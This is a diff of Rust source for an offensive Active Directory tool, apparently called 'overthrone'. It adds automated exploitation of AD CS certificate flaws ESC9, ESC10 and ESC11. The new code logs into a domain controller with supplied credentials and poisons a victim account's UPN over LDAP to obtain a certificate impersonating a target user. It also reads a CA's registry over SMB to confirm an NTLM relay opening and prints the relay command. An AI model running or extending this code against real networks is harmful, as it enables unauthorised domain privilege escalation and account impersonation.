@@ -2214,6 +2214,12 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             victim,
             original_upn,
             ldap_url,
+            dc,
+            ldap_user,
+            ldap_pass,
+            ldap_domain,
+            victim_dn,
+            ldaps,
             output,
         } => {
             println!(
@@ -2225,24 +2231,32 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             println!("    Target UPN: {}", target_upn.cyan());
             println!("    Victim Account: {}", victim.cyan());
 
+            // Determine whether we have a full live credential set for automatic LDAP UPN poisoning
+            let live_ldap = match (
+                dc.as_deref(),
+                ldap_user.as_deref(),
+                ldap_pass.as_deref(),
+                ldap_domain.as_deref(),
+                victim_dn.as_deref(),
+            ) {
+                (Some(dc_ip), Some(user), Some(pass), Some(domain), Some(dn)) => Some((
+                    dc_ip.to_string(),
+                    user.to_string(),
+                    pass.to_string(),
+                    domain.to_string(),
+                    dn.to_string(),
+                )),
+                _ => None,
+            };
+
             let config = overthrone_core::adcs::Esc9Config {
                 template: template.clone(),
                 victim_account: victim.clone(),
+                victim_dn: victim_dn.clone().unwrap_or_default(),
                 original_upn: original_upn.clone(),
                 target_upn: target_upn.clone(),
                 ldap_url: ldap_url.clone(),
             };
-
-            let (set_cmd, restore_cmd) =
-                overthrone_core::adcs::Esc9Exploiter::generate_ldap_commands(&config);
-
-            println!("\n  {} LDAP Setup Commands:", "▸".bright_black());
-            println!("{}", set_cmd.yellow());
-            println!(
-                "\n  {} After obtaining certificate, restore the UPN:",
-                "▸".bright_black()
-            );
-            println!("{}", restore_cmd.dimmed());
 
             let exploiter = match overthrone_core::adcs::Esc9Exploiter::new(ca) {
                 Ok(e) => e,
@@ -2252,11 +2266,66 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
             };
 
-            match exploiter.exploit(&config).await {
+            let result = if let Some((dc_ip, user, pass, domain, dn)) = live_ldap {
+                // ─ LIVE MODE: connect LDAP and auto-poison/restore UPN ─
+                println!(
+                    "  {} Live LDAP mode: auto-poisoning UPN via {}",
+                    "▸".bright_black(),
+                    dc_ip
+                );
+                let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
+                    &dc_ip, &domain, &user, &pass, *ldaps,
+                )
+                .await;
+                let mut ldap_session = match ldap_result {
+                    Ok(s) => s,
+                    Err(e) => {
+                        banner::print_fail(&format!("LDAP connect failed: {}", e));
+                        return 1;
+                    }
+                };
+                // Patch victim_dn into config for the live call
+                let live_config = overthrone_core::adcs::Esc9Config {
+                    victim_dn: dn,
+                    ..config.clone()
+                };
+                exploiter
+                    .exploit_with_ldap(&live_config, &mut ldap_session)
+                    .await
+            } else {
+                // ─ GUIDANCE MODE: print operator commands, do CSR only ─
+                let (set_cmd, restore_cmd) =
+                    overthrone_core::adcs::Esc9Exploiter::generate_ldap_commands(&config);
+                println!("\n  {} LDAP Setup Commands:", "▸".bright_black());
+                println!("{}", set_cmd.yellow());
+                println!(
+                    "\n  {} After obtaining certificate, restore the UPN:",
+                    "▸".bright_black()
+                );
+                println!("{}", restore_cmd.dimmed());
+                println!(
+                    "  {} Tip: supply --dc/--ldap-user/--ldap-pass/--ldap-domain/--victim-dn for fully automated mode",
+                    "i".dimmed()
+                );
+                exploiter.exploit(&config).await.map(|mut r| {
+                    r.upn_restored = false;
+                    r
+                })
+            };
+
+            match result {
                 Ok(result) => {
                     println!("\n  {} Certificate obtained!", "✓".green());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
                     println!("    Saved to: {}", output.cyan());
+                    if result.upn_restored {
+                        println!("    UPN: {} restored", "✓".green());
+                    } else {
+                        println!(
+                            "    UPN: {} restore pending (see LDAP commands above)",
+                            "!".yellow()
+                        );
+                    }
                     println!("    PKINIT: {}", result.pkinit_hint.yellow());
                 }
                 Err(e) => {
@@ -2270,6 +2339,14 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             template,
             target_upn,
             variant,
+            victim,
+            victim_dn,
+            original_upn,
+            dc,
+            ldap_user,
+            ldap_pass,
+            ldap_domain,
+            ldaps,
             output,
         } => {
             println!(
@@ -2287,12 +2364,42 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             };
             println!("    Variant: {}", esc_variant.to_string().cyan());
 
+            // Determine whether we have enough for a Variant B live run
+            let live_ldap_b = match (
+                &esc_variant,
+                dc.as_deref(),
+                ldap_user.as_deref(),
+                ldap_pass.as_deref(),
+                ldap_domain.as_deref(),
+                victim_dn.as_deref(),
+                original_upn.as_deref(),
+            ) {
+                (
+                    overthrone_core::adcs::Esc10Variant::UPNMappingEnabled,
+                    Some(dc_ip),
+                    Some(user),
+                    Some(pass),
+                    Some(domain),
+                    Some(dn),
+                    Some(orig),
+                ) => Some((
+                    dc_ip.to_string(),
+                    user.to_string(),
+                    pass.to_string(),
+                    domain.to_string(),
+                    dn.to_string(),
+                    orig.to_string(),
+                )),
+                _ => None,
+            };
+
             let config = overthrone_core::adcs::Esc10Config {
-                variant: esc_variant,
+                variant: esc_variant.clone(),
                 template: template.clone(),
                 target_upn: target_upn.clone(),
-                victim_account: None,
-                original_upn: None,
+                victim_account: victim.clone(),
+                victim_dn: victim_dn.clone(),
+                original_upn: original_upn.clone(),
             };
 
             let exploiter = match overthrone_core::adcs::Esc10Exploiter::new(ca) {
@@ -2303,7 +2410,44 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
             };
 
-            match exploiter.exploit(&config).await {
+            let result = if let Some((dc_ip, user, pass, domain, dn, orig)) = live_ldap_b {
+                // ─ LIVE MODE (Variant B): connect LDAP and auto-poison/restore UPN ─
+                println!(
+                    "  {} Live LDAP mode (Variant B): auto-poisoning UPN via {}",
+                    "▸".bright_black(),
+                    dc_ip
+                );
+                let ldap_result = overthrone_core::proto::ldap::LdapSession::connect(
+                    &dc_ip, &domain, &user, &pass, *ldaps,
+                )
+                .await;
+                let mut ldap_session = match ldap_result {
+                    Ok(s) => s,
+                    Err(e) => {
+                        banner::print_fail(&format!("LDAP connect failed: {}", e));
+                        return 1;
+                    }
+                };
+                let live_config = overthrone_core::adcs::Esc10Config {
+                    victim_dn: Some(dn),
+                    original_upn: Some(orig),
+                    ..config.clone()
+                };
+                exploiter
+                    .exploit_with_ldap(&live_config, &mut ldap_session)
+                    .await
+            } else {
+                // ─ STANDARD MODE: Variant A always works; Variant B without creds prints a hint ─
+                if esc_variant == overthrone_core::adcs::Esc10Variant::UPNMappingEnabled {
+                    println!(
+                        "  {} Tip: supply --dc/--ldap-user/--ldap-pass/--ldap-domain/--victim-dn/--original-upn for fully automated Variant B",
+                        "i".dimmed()
+                    );
+                }
+                exploiter.exploit(&config).await
+            };
+
+            match result {
                 Ok(result) => {
                     println!("\n  {} Certificate obtained!", "✓".green());
                     println!("    Thumbprint: {}", result.certificate.thumbprint.cyan());
@@ -2324,6 +2468,9 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             ca_host,
             ca_name,
             template,
+            smb_user,
+            smb_pass,
+            smb_domain,
         } => {
             println!(
                 "  {} Assessing ESC11 (NTLM Relay to ICPR)...",
@@ -2342,20 +2489,77 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
 
             let exploiter = overthrone_core::adcs::Esc11Exploiter::new(config);
 
-            match exploiter.assess().await {
-                Ok(assessment) => {
-                    println!("\n  {} Registry to verify:", "▸".bright_black());
-                    println!("    {}", assessment.registry_path.cyan());
-                    println!("\n  {} Relay command:", "▸".bright_black());
-                    println!("{}", assessment.relay_command.yellow());
-                    println!("\n  {} Remediation:", "▸".bright_black());
-                    println!("{}", assessment.remediation.dimmed());
+            // Determine whether we have SMB credentials for a live registry read
+            let live_smb = match (
+                smb_user.as_deref(),
+                smb_pass.as_deref(),
+                smb_domain.as_deref(),
+            ) {
+                (Some(user), Some(pass), Some(domain)) => {
+                    Some((user.to_string(), pass.to_string(), domain.to_string()))
                 }
-                Err(e) => {
-                    banner::print_fail(&format!("ESC11 assessment failed: {}", e));
-                    return 1;
+                _ => None,
+            };
+
+            let assessment = if let Some((user, pass, domain)) = live_smb {
+                // ─ LIVE MODE: read InterfaceFlags via WINREG RPC ─
+                println!(
+                    "  {} Live mode: connecting SMB to {} for registry read...",
+                    "▸".bright_black(),
+                    ca_host
+                );
+                let smb_result = overthrone_core::proto::smb::SmbSession::connect(
+                    ca_host, &domain, &user, &pass,
+                )
+                .await;
+                match smb_result {
+                    Ok(mut smb) => match exploiter.assess_with_smb(&mut smb).await {
+                        Ok(a) => a,
+                        Err(e) => {
+                            banner::print_fail(&format!("ESC11 live assessment failed: {}", e));
+                            return 1;
+                        }
+                    },
+                    Err(e) => {
+                        banner::print_fail(&format!("SMB connect to {} failed: {}", ca_host, e));
+                        return 1;
+                    }
                 }
+            } else {
+                // ─ GUIDANCE MODE: assessment without live registry read ─
+                println!(
+                    "  {} Tip: supply --smb-user/--smb-pass/--smb-domain for live InterfaceFlags registry read",
+                    "i".dimmed()
+                );
+                match exploiter.assess().await {
+                    Ok(a) => a,
+                    Err(e) => {
+                        banner::print_fail(&format!("ESC11 assessment failed: {}", e));
+                        return 1;
+                    }
+                }
+            };
+
+            if assessment.is_vulnerable {
+                println!(
+                    "  {} CA is VULNERABLE to ESC11 (IF_ENFORCEENCRYPTICERTREQUEST disabled)",
+                    "★".red().bold()
+                );
+                if let Some(flags) = assessment.interface_flags {
+                    println!("    InterfaceFlags: 0x{:08X}", flags);
+                }
+            } else if assessment.interface_flags.is_some() {
+                println!(
+                    "  {} CA appears NOT vulnerable (IF_ENFORCEENCRYPTICERTREQUEST is set)",
+                    "✓".green()
+                );
             }
+            println!("\n  {} Registry path checked:", "▸".bright_black());
+            println!("    {}", assessment.registry_path.cyan());
+            println!("\n  {} Relay command:", "▸".bright_black());
+            println!("{}", assessment.relay_command.yellow());
+            println!("\n  {} Remediation:", "▸".bright_black());
+            println!("{}", assessment.remediation.dimmed());
         }
         AdcsAction::Esc12 {
             ca_host,
